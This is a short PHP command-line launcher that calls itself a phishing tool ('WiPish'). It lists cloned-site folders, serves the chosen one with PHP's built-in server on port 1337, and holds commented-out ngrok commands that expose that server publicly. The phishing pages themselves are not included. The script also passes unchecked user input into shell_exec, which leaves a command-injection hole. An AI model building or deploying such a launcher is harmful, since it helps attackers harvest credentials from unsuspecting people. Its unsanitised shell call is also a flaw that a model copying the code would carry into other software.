<?php

echo "
_________ _______ _________ _______  _______  _______ 
|\     /|\__   __/(       )\__   __/(  ____ \(  ____ \(  ____ \
| )   ( |   ) (   | () () |   ) (   | (    \/| (    \/| (    \/
| | _ | |   | |   | || || |   | |   | (_____ | (__    | |      
| |( )| |   | |   | |(_)| |   | |   (_____  )|  __)   | |      
| || || |   | |   | |   | |   | |         ) || (      | |      
| () () |___) (___| )   ( |___) (___/\____) || (____/\| (____/\
(_______)\_______/|/     \|\_______/\_______)(_______/(_______/

\n";
echo "Pishing Tools WiPish \nCreted By MasTenWap\n\n";



$directory = scandir('sites');
$directory =  array_diff($directory, array('.', '..'));
$no=2;
while($no <=33)
{
 if($no==2){$tab="\t";}else{$tab="\t\t\t";}
 if($no==12){$tab="\t\t";}else{$tab="\t\t\t";}
 echo $no.".".$directory[$no]."$tab";
 $no = $no+1;
 echo $no.".".$directory[$no]."\n";
 $no = $no+1;
}

echo "Masukan Nomor : ";
$sites = trim(fgets(STDIN));
//echo $directory[$sites]."\n";
echo "\n\nRunning Server 20 Detik";
//sleep(20);
$directory = $directory[$sites];
//exec("cd sites/$directory/ && php -S localhost:1337");
//exec("chmod 755 Ngrok.sh");
//exec("./ngrok http 1337");
//echo exec("curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url");
shell_exec("cd sites/$directory/ && php -S localhost:1337");
?>
